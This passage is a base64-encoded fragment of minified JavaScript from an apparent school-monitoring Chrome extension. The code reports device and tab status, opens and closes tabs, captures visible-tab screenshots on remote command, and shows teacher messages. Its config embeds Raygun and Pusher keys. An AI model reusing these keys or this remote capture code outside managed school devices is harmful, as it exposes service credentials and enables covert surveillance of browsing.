cmluZ1RvQnl0ZXModW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGUpKSl9fSwidW5kZWZpbmVkIiE9dHlwZW9mIGUmJmUuZXhwb3J0cz9lLmV4cG9ydHM9bjp0LmNvbnZlcnRTdHJpbmc9bn0odGhpcyl9LGZ1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dmFyIHI9bigzKSgiYnJvd3Nlci1tb25pdG9yIiksaT1uKDQpO2Nocm9tZS5pZGxlLm9uU3RhdGVDaGFuZ2VkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKGUpe3IuaSgic3RhdGUgY2hhbmdlZDoiLGUpfSksZnVuY3Rpb24oKXt2YXIgZT0obmV3IERhdGUpLmdldFRpbWUoKTtzZXRJbnRlcnZhbChmdW5jdGlvbigpe3ZhciB0PShuZXcgRGF0ZSkuZ2V0VGltZSgpO3QtZT42ZTMmJnIuaSgiU3lzdGVtIHdva2UgZnJvbSBzdXNwZW5kIiksZT10fSw1ZTMpfSgpLHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJvbmxpbmUiLGZ1bmN0aW9uKCl7ci5pKCJicm93c2VyIGlzIG9ubGluZSIpLGkuZ2xvYmFsQ29uZmlnLnJlZnJlc2hDb25maWcoKSxpLnVzZXJzLnJlZnJlc2hDb25maWcoITApfSksd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoIm9mZmxpbmUiLGZ1bmN0aW9uKCl7ci5pKCJicm93c2VyIGlzIG9mZmxpbmUiKX0pfSxmdW5jdGlvbihlLHQsbil7dmFyIHIsaT1uKDI5KSxzPW4oMTEpLG89Y2hyb21lLmV4dGVuc2lvbi5nZXRCYWNrZ3JvdW5kUGFnZSgpPT09d2luZG93O28mJihyPW4oMykoImNvbmZpZy1kZWZhdWx0cyIpKTt2YXIgYT1lLmV4cG9ydHM9e2Vudmlyb25tZW50OiJkZWZhdWx0Iix1c2VyX2NoZWNrX3VybDoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSIsdXNlcl9jaGVja19pbnRlcnZhbDozZTUsdGVzdF9tb2RlOiExLGhhc2hfdXNlcl9pZHM6ITEsaHR0cF90aW1lb3V0OjE1ZTMsYWN0aXZpdHlfc3RyZWFtX3RpbWVvdXQ6NmU0LHJheWd1bjp7ZW5hYmxlZDohMX19O2EucmVhZHk9bmV3IHMoZnVuY3Rpb24oZSl7Y2hyb21lLnN0b3JhZ2UubG9jYWwuZ2V0KFsiaW5zdGFuY2VfaWQiLCJicm93c2VyX3ZlcnNpb24iLCJleHRlbnNpb25fdmVyc2lvbiJdLGZ1bmN0aW9uKHQpeyJpbnN0YW5jZV9pZCJpbiB0P2EuaW5zdGFuY2VfaWQ9dC5pbnN0YW5jZV9pZDooYS5pbnN0YW5jZV9pZD1pLnY0KCksbyYmci5hdWRpdCgiaW5zdGFuY2VfaWQuZ2VuZXJhdGVkIiksY2hyb21lLnN0b3JhZ2UubG9jYWwuc2V0KHtpbnN0YW5jZV9pZDphLmluc3RhbmNlX2lkfSkpO3ZhciBuPXdpbmRvdy5uYXZpZ2F0b3IuYXBwVmVyc2lvbi5tYXRjaCgvQ2hyb21lXC8oXFMrKS8pO2EuYnJvd3Nlcl92ZXJzaW9uPW5bMV0sImJyb3dzZXJfdmVyc2lvbiJpbiB0P28mJnQuYnJvd3Nlcl92ZXJzaW9uIT09YS5icm93c2VyX3ZlcnNpb24mJnIuYXVkaXQoImJyb3dzZXJfdmVyc2lvbi5jaGFuZ2VkIix7YnJvd3Nlcl92ZXJzaW9uOmEuYnJvd3Nlcl92ZXJzaW9uLHByZXZpb3VzX2Jyb3dzZXJfdmVyc2lvbjp0LmJyb3dzZXJfdmVyc2lvbn0pOm8mJnIuYXVkaXQoImJyb3dzZXJfdmVyc2lvbi5pbnN0YWxsZWQiKSxjaHJvbWUuc3RvcmFnZS5sb2NhbC5zZXQoe2Jyb3dzZXJfdmVyc2lvbjphLmJyb3dzZXJfdmVyc2lvbn0pLGEuZXh0ZW5zaW9uX3ZlcnNpb249Y2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS52ZXJzaW9uLCJleHRlbnNpb25fdmVyc2lvbiJpbiB0P28mJnQuZXh0ZW5zaW9uX3ZlcnNpb24hPT1hLmV4dGVuc2lvbl92ZXJzaW9uJiZyLmF1ZGl0KCJleHRlbnNpb25fdmVyc2lvbi5jaGFuZ2VkIix7ZXh0ZW5zaW9uX3ZlcnNpb246YS5leHRlbnNpb25fdmVyc2lvbixwcmV2aW91c19leHRlbnNpb25fdmVyc2lvbjp0LmV4dGVuc2lvbl92ZXJzaW9ufSk6byYmci5hdWRpdCgiZXh0ZW5zaW9uX3ZlcnNpb24uaW5zdGFsbGVkIiksY2hyb21lLnN0b3JhZ2UubG9jYWwuc2V0KHtleHRlbnNpb25fdmVyc2lvbjphLmV4dGVuc2lvbl92ZXJzaW9ufSksZSgpfSl9KX0sZnVuY3Rpb24oZSx0KXtlLmV4cG9ydHM9e2Vudmlyb25tZW50OiJwcm9kdWN0aW9uIixsb2dfdXJsOiJodHRwczovL2hpZ2hsaWdodHMtbG9nZ2luZy50ZWFjaGVyZGFzaGJvYXJkLmNvbS9sb2ciLGFwaV91cmw6Imh0dHBzOi8vaGlnaGxpZ2h0cy1tZXNzYWdpbmcudGVhY2hlcmRhc2hib2FyZC5jb20vZXh0ZW5zaW9uLyIsYWN0aXZpdHlfc3RyZWFtX3VybDoiaHR0cHM6Ly9zYXBpLWhpZ2hsaWdodHMudGVhY2hlcmRhc2hib2FyZC5jb20vc2FwaS1hcGkvbGF0ZXN0L2FjdGl2aXR5IixyYXlndW46e2FwaV9rZXk6IktqMEphVUNUVE9lOXNVWFNsb1NYWmc9PSIsZW5hYmxlZDohMX0scHVzaGVyOnthdXRoX2VuZHBvaW50OiJodHRwczovL2hpZ2hsaWdodHMtbWVzc2FnaW5nLnRlYWNoZXJkYXNoYm9hcmQuY29tL2V4dGVuc2lvbi9wdXNoZXIvYXV0aCIsa2V5OiJiMWM2MTk2N2U5ODNjZDYxYjk3ZCIsc2VuZF91cmw6Imh0dHBzOi8vaGlnaGxpZ2h0cy1tZXNzYWdpbmcudGVhY2hlcmRhc2hib2FyZC5jb20vZXh0ZW5zaW9uL21lc3NhZ2UifX19LGZ1bmN0aW9uKGUsdCxuKXtmdW5jdGlvbiByKCl7dmFyIGU9aC5yZWR1Y2UoZnVuY3Rpb24oZSx0KXtyZXR1cm57c2VydmVyX3RpbWU6ZS5zZXJ2ZXJfdGltZSt0LnNlcnZlcl90aW1lLHJlc3BvbnNlX3RpbWU6ZS5yZXNwb25zZV90aW1lK3QucmVzcG9uc2VfdGltZX19LHtzZXJ2ZXJfdGltZTowLHJlc3BvbnNlX3RpbWU6MH0pO3JldHVybiBlLnNlcnZlcl90aW1lLz1oLmxlbmd0aCxlLnJlc3BvbnNlX3RpbWUvPWgubGVuZ3RoLHtyZXBvcnRfdGltZToobmV3IERhdGUpLmdldFRpbWUoKSxpbnN0YW5jZV9pZDphLmluc3RhbmNlX2lkLGJyb3dzZXJfdmVyc2lvbjphLmJyb3dzZXJfdmVyc2lvbixleHRlbnNpb25fdmVyc2lvbjphLmV4dGVuc2lvbl92ZXJzaW9uLHByb2ZpbGVfdXNlcjppLnVzZXJNb25pdG9yaW5nLnN0YXRlLmdldCgicHJvZmlsZV9lbWFpbCIpfHxudWxsLG5ldHdvcmtfc3RhdHM6ZSx1c2VyX2xpc3Q6aS51c2Vycy5tYXAoZnVuY3Rpb24oZSl7cmV0dXJue2lkOmUuaWQsc3RhdGU6ZS5nZXRVc2VyU3RhdHVzKCl9fSksbG9ja2luZzpjLmdldFN0YXRlKCl9fXZhciBpPW4oNCkscz1uKDE4KSxvPW4oMykoImRldmljZS1zdGF0dXMiKSxhPW4oNSksdT1uKDExKSxjPW4oMzIpLGw9big4KSxkPXt9LGg9W107Y2hyb21lLndlYlJlcXVlc3Qub25BdXRoUmVxdWlyZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSl7cmV0dXJuIm1haW5fZnJhbWUiPT09ZS50eXBlP3ZvaWQgMDp7Y2FuY2VsOiEwfX0se3VybHM6WyI8YWxsX3VybHM+Il19LFsiYmxvY2tpbmciXSksY2hyb21lLndlYlJlcXVlc3Qub25TZW5kSGVhZGVycy5hZGRMaXN0ZW5lcihmdW5jdGlvbihlKXt2YXIgdD1kW2UucmVxdWVzdElkXT1kW2UucmVxdWVzdElkXXx8e2NyZWF0ZWQ6KG5ldyBEYXRlKS5nZXRUaW1lKCl9O3Quc2VuZEhlYWRlcnM9ZX0se3VybHM6WyI8YWxsX3VybHM+Il19KSxjaHJvbWUud2ViUmVxdWVzdC5vblJlc3BvbnNlU3RhcnRlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbihlKXt2YXIgdD1kW2UucmVxdWVzdElkXT1kW2UucmVxdWVzdElkXXx8e2NyZWF0ZWQ6KG5ldyBEYXRlKS5nZXRUaW1lKCl9O3QucmVzcG9uc2VTdGFydGVkPWV9LHt1cmxzOlsiPGFsbF91cmxzPiJdfSksY2hyb21lLndlYlJlcXVlc3Qub25Db21wbGV0ZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSl7dmFyIHQ9ZFtlLnJlcXVlc3RJZF09ZFtlLnJlcXVlc3RJZF18fHtjcmVhdGVkOihuZXcgRGF0ZSkuZ2V0VGltZSgpfTtpZihkZWxldGUgZFtlLnJlcXVlc3RJZF0sdC5zZW5kSGVhZGVycyYmdC5yZXNwb25zZVN0YXJ0ZWQpZm9yKGgucHVzaCh7c2VydmVyX3RpbWU6dC5yZXNwb25zZVN0YXJ0ZWQudGltZVN0YW1wLXQuc2VuZEhlYWRlcnMudGltZVN0YW1wLHJlc3BvbnNlX3RpbWU6ZS50aW1lU3RhbXAtdC5yZXNwb25zZVN0YXJ0ZWQudGltZVN0YW1wfSk7aC5sZW5ndGg+MTA7KWguc2hpZnQoKX0se3VybHM6WyI8YWxsX3VybHM+Il19LFsicmVzcG9uc2VIZWFkZXJzIl0pLHNldEludGVydmFsKGZ1bmN0aW9uKCl7Zm9yKHZhciBlIGluIGQpZFtlXS5jcmVhdGVkPChuZXcgRGF0ZSkuZ2V0VGltZSgpLTEyZTQmJmRlbGV0ZSBkW2VdfSw2ZTQpO3ZhciBmPWwuZGVib3VuY2UobC50aHJvdHRsZShmdW5jdGlvbigpe3MucmVwb3J0X2RldmljZV9zdGF0dXMocil9LGEudGVzdF9tb2RlPzIwMDoyZTMpLGEudGVzdF9tb2RlPzIwOjIwMCkscD1mdW5jdGlvbihlKXtyZXR1cm4gZnVuY3Rpb24oKXtvLmQoIkRldmljZSBzdGF0dXMgdHJpZ2dlcmVkIGJ5IixlKSxmKCl9fSxfPW5ldyB1KGZ1bmN0aW9uKGUpe3UuYWxsKFtpLnJlYWR5XSkudGhlbihmdW5jdGlvbigpe28uZCgiZGV2aWNlLXN0YXR1cyBzdWJzeXN0ZW0gc3RhcnRpbmciKSxmKCksaS51c2Vycy5vbigiYWRkIixwKCJ1c2VyIGFkZCIpKSxpLnVzZXJzLm9uKCJyZW1vdmUiLHAoInVzZXIgcmVtb3ZlIikpLGkudXNlcnMub24oImNoYW5nZSIscCgidXNlciBjaGFuZ2UiKSksaS5tZXNzYWdpbmcuY2hhbm5lbHMub24oImFkZCIscCgiY2hhbm5lbCBhZGQiKSksaS5tZXNzYWdpbmcuY2hhbm5lbHMub24oInJlbW92ZSIscCgiY2hhbm5lbCByZW1vdmUiKSksaS5tZXNzYWdpbmcuY2hhbm5lbHMub24oImNoYW5nZSIscCgiY2hhbm5lbCBjaGFuZ2UiKSksaS51c2VyTW9uaXRvcmluZy5zdGF0ZS5vbigiY2hhbmdlOnByb2ZpbGVfZW1haWwiLHAoInByb2ZpbGUgY2hhbmdlIikpLGMudGFiTG9ja2luZy5vbigiY2hhbmdlIixwKCJ0YWJsb2NraW5nIGNoYW5nZSIpKSxlKCl9KX0pO2UuZXhwb3J0cz17Z2VuZXJhdGVfZGV2aWNlX3N0YXR1czpyLHJlcXVlc3RJbmZvOmQscmVhZHk6X319LGZ1bmN0aW9uKGUsdCxuKXtmdW5jdGlvbiByKGUsdCl7dHJ5e28uYWN0aXZpdHlTdHJlYW0mJm8uYWN0aXZpdHlTdHJlYW0uZXh0ZW5zaW9uUmVtb3ZlVGFiKGUpLGNocm9tZS50YWJzLnJlbW92ZShlLGZ1bmN0aW9uKCl7Y2hyb21lLnJ1bnRpbWUubGFzdEVycm9yfHwiZnVuY3Rpb24iPT10eXBlb2YgdCYmdCgpfSl9Y2F0Y2gobil7fX1mdW5jdGlvbiBpKGUsdCxuKXsiZnVuY3Rpb24iIT10eXBlb2YgbiYmKG49ZnVuY3Rpb24oZSl7YS5lKCJkb19vcGVuX3RhYjogIixlKX0pO3RyeXtjaHJvbWUud2luZG93cy5nZXRBbGwoZnVuY3Rpb24ocil7aWYoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKXJldHVybiB2b2lkIG4oY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKTt0cnl7MD09PXIubGVuZ3RoP2Nocm9tZS53aW5kb3dzLmNyZWF0ZSh7dXJsOmV9LGZ1bmN0aW9uKGUpe2lmKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcilyZXR1cm4gdm9pZCBuKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik7aWYoIWV8fCFlLnRhYnN8fCFlLnRhYnNbMF0pcmV0dXJuIHZvaWQgbigiQ291bGRuJ3QgZmluZCB0YWJzIG9iamVjdCBpbiBuZXdseSBjcmVhdGVkIHdpbmRvdyIpO3ZhciByPWUudGFic1swXTtvLmFjdGl2aXR5U3RyZWFtJiZvLmFjdGl2aXR5U3RyZWFtLmV4dGVuc2lvbkFkZFRhYihyKSwiZnVuY3Rpb24iPT10eXBlb2YgdCYmdCgpfSk6Y2hyb21lLnRhYnMuY3JlYXRlKHt1cmw6ZX0sZnVuY3Rpb24oZSl7cmV0dXJuIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcj92b2lkIG4oY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKTooby5hY3Rpdml0eVN0cmVhbSYmby5hY3Rpdml0eVN0cmVhbS5leHRlbnNpb25BZGRUYWIoZSksdm9pZCgiZnVuY3Rpb24iPT10eXBlb2YgdCYmdCgpKSl9KX1jYXRjaChpKXtuKGkpfX0pfWNhdGNoKHIpe24ocil9fWZ1bmN0aW9uIHMoZSx0LG4scixpKXt2YXIgcz1uZXcgd2luZG93LkltYWdlO3Muc3JjPWUscy5vbmxvYWQ9ZnVuY3Rpb24oKXtpZihzLndpZHRoPD10KXJldHVybiB2b2lkIGkoZSk7dmFyIG49dCxvPU1hdGgucm91bmQocy5oZWlnaHQqKG4vcy53aWR0aCkpLGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiY2FudmFzIik7YS53aWR0aD1uLGEuaGVpZ2h0PW87dmFyIHU9YS5nZXRDb250ZXh0KCIyZCIpO3UuZHJhd0ltYWdlKHMsMCwwLG4sbyk7dmFyIGM9YS50b0RhdGFVUkwoImltYWdlL2pwZWciLHIpO2koYyl9fXZhciBvPW4oNCksYT1uKDMpKCJpbnRlcmFjdC1kZXByZWNhdGVkIiksdT1uKDExKTtlLmV4cG9ydHM9e2dldHRhYnM6ZnVuY3Rpb24oZSl7dmFyIHQ9big5KS50YWJzLm1hcChmdW5jdGlvbihlKXtyZXR1cm57aWQ6ZS5pZCx0aXRsZTplLmdldCgidGl0bGUiKSxpY29uOmUuZ2V0KCJpY29uIiksYWN0aXZlOmUuZ2V0KCJhY3RpdmUiKSx1cmw6ZS5nZXQoInVybCIpLHdoZW46ZS5nZXQoIndoZW4iKX19KTtvLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInNlbmR0YWJzIix7dGFiczp0fSkpfSxjbG9zZXRhYjpmdW5jdGlvbihlLHQpe3ZhciBuPWUucGF5bG9hZC50YWJfaWQ7cihuLGZ1bmN0aW9uKCl7c2V0VGltZW91dCh0aGlzLmdldHRhYnMuYmluZCh0aGlzLGUsdCksNTAwKX0uYmluZCh0aGlzKSl9LG9wZW50YWI6ZnVuY3Rpb24oZSx0KXtpKGUucGF5bG9hZC51cmwsZnVuY3Rpb24oKXtzZXRUaW1lb3V0KHRoaXMuZ2V0dGFicy5iaW5kKHRoaXMsZSx0KSw1MDApfS5iaW5kKHRoaXMpKX0sc2V0dGFiczpmdW5jdGlvbihlKXt2YXIgdD1uKDkpLHM9ZS5wYXlsb2FkLnVybHMubWFwKGZ1bmN0aW9uKGUpe3JldHVybiBudWxsPT09ZT8iY2hyb21lOi8vbmV3dGFiLyI6ZX0pLG89W107dC50YWJzLmZvckVhY2goZnVuY3Rpb24oZSl7dmFyIHQ9cy5pbmRleE9mKGUuZ2V0KCJ1cmwiKSk7LTE9PT10P28ucHVzaChlLmlkKTpzLnNwbGljZSh0LDEpfSk7dmFyIGE9W107cy5mb3JFYWNoKGZ1bmN0aW9uKGUpe2EucHVzaChuZXcgdShpLmJpbmQobnVsbCxlKSkpfSk7dmFyIGM9ZnVuY3Rpb24oKXtvLmZvckVhY2goZnVuY3Rpb24oZSl7cihlKX0pfTthLmxlbmd0aD91LmFsbChhKS50aGVuKGMpOmMoKX0sbWVzc2FnZTpmdW5jdGlvbihlKXt0cnl7Y2hyb21lLm5vdGlmaWNhdGlvbnMuY3JlYXRlKCIiLHt0eXBlOiJiYXNpYyIsdGl0bGU6Ik1lc3NhZ2UgZnJvbSBUZWFjaGVyIixtZXNzYWdlOlN0cmluZyhlLnBheWxvYWQubWVzc2FnZSksaWNvblVybDoiaWNvbnMvaWNvbjEyOC5wbmciLHByaW9yaXR5OjIsaXNDbGlja2FibGU6ITF9LGZ1bmN0aW9uKCl7fSl9Y2F0Y2godCl7YS5lKCJGYWlsZWQgdG8gY3JlYXRlIG5vdGlmaWNhdGlvbiAodXNpbmcgYWxlcnQpOiIsdCl9fSxzY3JlZW5zaG90OmZ1bmN0aW9uKGUpe3ZhciB0PW5ldyB1KGZ1bmN0aW9uKHQpe2Nocm9tZS50YWJzLmNhcHR1cmVWaXNpYmxlVGFiKG51bGwse2Zvcm1hdDoianBlZyIscXVhbGl0eTpwYXJzZUludCgxMDAqZS5wYXlsb2FkLnF1YWxpdHksMTApfSxmdW5jdGlvbihuKXtzKG4sZS5wYXlsb2FkLm1heF93aWR0aHx8MWUzLGUucGF5bG9hZC5tYXhfaGVpZ2h0fHwxZTMsZS5wYXlsb2FkLnF1YWxpdHksZnVuY3Rpb24oZSl7YS5kKCJyZXNpemVkIHNjcmVlbnNob3QgZnJvbSIsbi5sZW5ndGgsInRvIixlLmxlbmd0aCwiYnl0ZXMiKSx0KGUpfSl9KX0pLG49bmV3IHUoZnVuY3Rpb24oZSl7Y2hyb21lLnRhYnMucXVlcnkoe2FjdGl2ZTohMCxjdXJyZW50V2luZG93OiEwfSxmdW5jdGlvbih0KXt2YXIgbj17fSxyPXRbMF07ciYmKG4uaWQ9ci5pZCxuLnRpdGxlPXIudGl0bGUsbi51cmw9ci51cmwpLGUobil9KX0pO3UuYWxsKFtuLHRdKS50aGVuKGZ1bmN0aW9uKHQpe3ZhciBuPXRbMF07bi5pbWFnZT10WzFdLG8ubWVzc2FnaW5nLnNlbmQoZS5nZW5lcmF0ZV9yZXBseSgic2NyZWVuc2hvdCIsbikpfSl9fX0sZnVuY3Rpb24oZSx0LG4pe3ZhciByPW4oNCksaT1uKDMpKCJpbnRlcmFjdC1tZXNzYWdlIikscz1uKDI5KSxvPW4oMjIpLGE9e307Y2hyb21lLm5vdGlmaWNhdGlvbnMub25DbG9zZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSl7ZS5tYXRjaCgvXm1lc3NhZ2luZy0vKSYmKGkuZCgiY2xvc2VkIG5vdGlmaWNhdGlvbjoiLGUpLGRlbGV0ZSBhW2VdKX0pLGNocm9tZS5ub3RpZmljYXRpb25zLm9uQnV0dG9uQ2xpY2tlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbihlKXtpZihlLm1hdGNoKC9ebWVzc2FnaW5nLS8pKXt2YXIgdD1hW2VdO3JldHVybiB0P3ZvaWQgY2hyb21lLnRhYnMuY3JlYXRlKHt1cmw6Y2hyb21lLmV4dGVuc2lvbi5nZXRVUkwoImhpZ2hsaWdodHMtbWVzc2FnZS1yZXBseS5odG1sIyIrZSl9KTp2b2lkIGkuZSgiQ291bGRuJ3QgZmluZCBtZXNzYWdlIGZvciBub3RpZmljYXRpb25JZCIpfX0pLGNocm9tZS5ydW50aW1lLm9uTWVzc2FnZS5hZGRMaXN0ZW5lcihmdW5jdGlvbihlLHQsbil7c3dpdGNoKGUudHlwZSl7Y2FzZSJpbnRlcmFjdC1tZXNzYWdlLWdldCI6dmFyIGk9YVtlLm5vdGlmaWNhdGlvbklkXTtyZXR1cm4gbihpP2kudG9fb2JqKCk6bnVsbCksITE7Y2FzZSJpbnRlcmFjdC1tZXNzYWdlLXJlcGx5IjpyZXR1cm4gaT1vLmZyb21fb2JqKGUubWVzc2FnZSksci5tZXNzYWdpbmcuc2VuZChpLHtyZXRyeVRpbWVvdXQ6MTAsb25TdWNjZXNzOmZ1bmN0aW9uKCl7bighMCksZGVsZXRlIGFbZS5ub3RpZmljYXRpb25JZF19LG9uRmFpbHVyZTpmdW5jdGlvbigpe24oITEpfX0pLCEwfX0pLGUuZXhwb3J0cz17cHJvY2Vzc01lc3NhZ2U6ZnVuY3Rpb24oZSl7dHJ5e3ZhciB0PSJtZXNzYWdpbmctIitzLnY0KCk7InRhYiI9PT1lLnBheWxvYWQudHlwZT8oYVt0XT1lLGNocm9tZS50YWJzLmNyZWF0ZSh7dXJsOmNocm9tZS5leHRlbnNpb24uZ2V0VVJMKCJoaWdobGlnaHRzLW1lc3NhZ2UtcmVwbHkuaHRtbCMiK3QpfSkpOihjaHJvbWUubm90aWZpY2F0aW9ucy5jcmVhdGUodCx7dHlwZToiYmFzaWMiLHRpdGxlOmNocm9tZS5pMThuLmdldE1lc3NhZ2UoIm1lc3NhZ2VQb3B1cFRpdGxlIixbZS5wYXlsb2FkLnNlbmRlcl0pLG1lc3NhZ2U6U3RyaW5nKGUucGF5bG9hZC5tZXNzYWdlKSxpY29uVXJsOiJpY29ucy9pY29uMTI4LnBuZyIscHJpb3JpdHk6Mixpc0NsaWNrYWJsZTohMSxidXR0b25zOmUucGF5bG9hZC5hbGxvd19yZXBseT9be3RpdGxlOmNocm9tZS5pMThuLmdldE1lc3NhZ2UoIm1lc3NhZ2VQb3B1cFJlcGx5QnV0dG9uIiksaWNvblVybDoiaWNvbnMvcmVwbHktMTI4LnBuZyJ9XTpbXX0sZnVuY3Rpb24oKXtpLmQoIm9wZW5lZCBub3RpZmljYXRpb246Iix0KSxhW3RdPWV9KSxyLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoIm1lc3NhZ2Uuc2VuZC5yZXNwb25zZSIse2Vycm9yOm51bGx9KSkpfWNhdGNoKG4pe3JldHVybiBpLmUoIkZhaWxlZCB0byBjcmVhdGUgbm90aWZpY2F0aW9uIixuKSxyLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoIm1lc3NhZ2Uuc2VuZC5yZXNwb25zZSIse2Vycm9yOiJmYWlsZWQgdG8gY3JlYXRlIGFsZXJ0OiAiK259KSl9fX19LGZ1bmN0aW9uKGUsdCl7dmFyIG49ZnVuY3Rpb24oZSx0KXtyZXR1cm4gbnVsbCE9PXQ/InN0cmluZyI9PXR5cGVvZiB0P3ZvaWQodC5tYXRjaCgvXmh0dHBzPzpcL1wvLyl8fHRoaXMucmVwb3J0KCJtdXN0IGJlIGEgdmFsaWQgVVJMIikpOnZvaWQgdGhpcy5yZXBvcnQoIm11c3QgYmUgZWl0aGVyIG51bGwgb3IgYSBzdHJpbmciKTp2b2lkIDB9LHI9eyJ0YWJzLmdldCI6e30sInRhYnMub3BlbiI6e3NjaGVtYTp7dHlwZToib2JqZWN0IixzdHJpY3Q6ITAscHJvcGVydGllczp7dXJsczp7dHlwZToiYXJyYXkiLGl0ZW1zOnt0eXBlOiJzdHJpbmciLHBhdHRlcm46InVybCJ9LG1pbkxlbmd0aDoxfX19fSwidGFicy5jbG9zZSI6e3NjaGVtYTp7dHlwZToib2JqZWN0IixzdHJpY3Q6ITAscHJvcGVydGllczp7dGFiX2lkczp7dHlwZToiYXJyYXkiLGl0ZW1zOnt0eXBlOiJpbnRlZ2VyIn0sbWluTGVuZ3RoOjF9fX19LCJ0YWJzLnNldCI6e3NjaGVtYTp7dHlwZToib2JqZWN0IixzdHJpY3Q6ITAscHJvcGVydGllczp7dXJsczp7dHlwZToiYXJyYXkiLGl0ZW1zOntleGVjOm59LG1pbkxlbmd0aDoxfX19fSwidGFicy5maWx0ZXIiOntzY2hlbWE6e3R5cGU6Im9iamVjdCIsc3RyaWN0OiEwLHByb3BlcnRpZXM6e3VybHM6e3R5cGU6ImFycmF5IixpdGVtczp7ZXhlYzpufSxtaW5MZW5ndGg6MX0sZG9tYWluczp7dHlwZToiYXJyYXkifX19fSwidGFicy5sb2NrIjp7c2FuaXRpemU6e3R5cGU6Im9iamVjdCIscHJvcGVydGllczp7dW5sb2NrRHVyYXRpb246e2RlZjowLG9wdGlvbmFsOiExfSx0ZWFjaGVyTmFtZTp7ZGVmOiIiLG9wdGlvbmFsOiExfX19LHNjaGVtYTp7dHlwZToib2JqZWN0IixzdHJpY3Q6ITAscHJvcGVydGllczp7dXJsczp7dHlwZToiYXJyYXkiLGl0ZW1zOnt0eXBlOiJzdHJpbmciLHBhdHRlcm46InVybCJ9fSxkb21haW5zOnt0eXBlOiJhcnJheSIsaXRlbXM6e3R5cGU6InN0cmluZyJ9fSx0aW1lb3V0Ont0eXBlOiJpbnRlZ2VyIixndDowfSxjbG9zZVRhYnM6e3R5cGU6ImJvb2xlYW4ifSxtZXNzYWdlOnt0eXBlOiJzdHJpbmcifSxtZXNzYWdlRHVyYXRpb246e3R5cGU6ImludGVnZXIiLGd0OjB9LHRlYWNoZXJOYW1lOnt0eXBlOiJzdHJpbmcifSx1bmxvY2tNZXNzYWdlOnt0eXBlOiJzdHJpbmciLG9wdGlvbmFsOiEwLGV4ZWM6ZnVuY3Rpb24oZSx0KXt0aGlzLm9yaWdpbi51bmxvY2tEdXJhdGlvbiYmIXQmJnRoaXMucmVwb3J0KCJtdXN0IGJlIHNwZWNpZmllZCBpZiB1bmxvY2tEdXJhdGlvbiBpcyBzcGVjaWZpZWQiKX19LHVubG9ja0R1cmF0aW9uOnt0eXBlOiJpbnRlZ2VyIixvcHRpb25hbDohMH0sdW5sb2NrQ2xvc2VUYWJzOnt0eXBlOiJib29sZWFuIixvcHRpb25hbDohMH0sdW5sb2NrQmVoYXZpb3VyOnt0eXBlOnt0eXBlOiJzdHJpbmciLHBhdHRlcm46L14obm90aGluZ3xjbG9zZV90YWJzfHJlc3RvcmVfdGFicykkL30sb3B0aW9uYWw6ITB9fSxleGVjOmZ1bmN0aW9uKGUsdCl7InVubG9ja0Nsb3NlVGFicyJpbiB0JiYidW5sb2NrQmVoYXZpb3VyImluIHQmJnRoaXMucmVwb3J0KCdjYW5cJ3QgaGF2ZSBib3RoICJ1bmxvY2tDbG9zZVRhYnMiIGFuZCAidW5sb2NrQmVoYXZpb3VyIiBrZXlzJyksInVubG9ja0Nsb3NlVGFicyJpbiB0fHwidW5sb2NrQmVoYXZpb3VyImluIHR8fHRoaXMucmVwb3J0KCdtdXN0IHNwZWNpZnkgZXhhY3RseSBvbmUgb2YgICJ1bmxvY2tDbG9zZVRhYnMiIGFuZCAidW5sb2NrQmVoYXZpb3VyIiBrZXlzJyl9fX0sInRhYnMudW5sb2NrIjp7c2NoZW1hOnt0eXBlOiJvYmplY3QiLHN0cmljdDohMCxwcm9wZXJ0aWVzOnttZXNzYWdlOnt0eXBlOiJzdHJpbmciLG9wdGlvbmFsOiEwLGV4ZWM6ZnVuY3Rpb24oZSx0KXt0aGlzLm9yaWdpbi5kdXJhdGlvbiYmIXQmJnRoaXMucmVwb3J0KCJtdXN0IGJlIHNwZWNpZmllZCBpZiBkdXJhdGlvbiBpcyBzcGVjaWZpZWQiKX19LGR1cmF0aW9uOnt0eXBlOiJpbnRlZ2VyIixvcHRpb25hbDohMH0sY2xvc2VUYWJzOnt0eXBlOiJib29sZWFuIixvcHRpb25hbDohMH0sYmVoYXZpb3VyOnt0eXBlOnt0eXBlOiJzdHJpbmciLHBhdHRlcm46L14obm90aGluZ3xjbG9zZV90YWJzfHJlc3RvcmVfdGFicykkL30sb3B0aW9uYWw6ITB9fSxleGVjOmZ1bmN0aW9uKGUsdCl7ImNsb3NlVGFicyJpbiB0JiYiYmVoYXZpb3VyImluIHQmJnRoaXMucmVwb3J0KCdjYW5cJ3QgaGF2ZSBib3RoICJjbG9zZVRhYnMiIGFuZCAiYmVoYXZpb3VyIiBrZXlzJyl9fX0sIm1lc3NhZ2Uuc2VuZCI6e3NjaGVtYTp7dHlwZToib2JqZWN0IixzdHJpY3Q6ITAscHJvcGVydGllczp7bWVzc2FnZTp7dHlwZToic3RyaW5nIn0sc2VuZGVyOnt0eXBlOiJzdHJpbmcifSx0eXBlOnt0eXBlOiJzdHJpbmciLHBhdHRlcm46L14odGFifHBvcHVwKSQvfSxhbGxvd19yZXBseTp7dHlwZToiYm9vbGVhbiJ9fX19LCJzY3JlZW5zaG90LnN0YXJ0X3JlY29yZGluZyI6e3NjaGVtYTp7dHlwZToib2JqZWN0IixzdHJpY3Q6ITAscHJ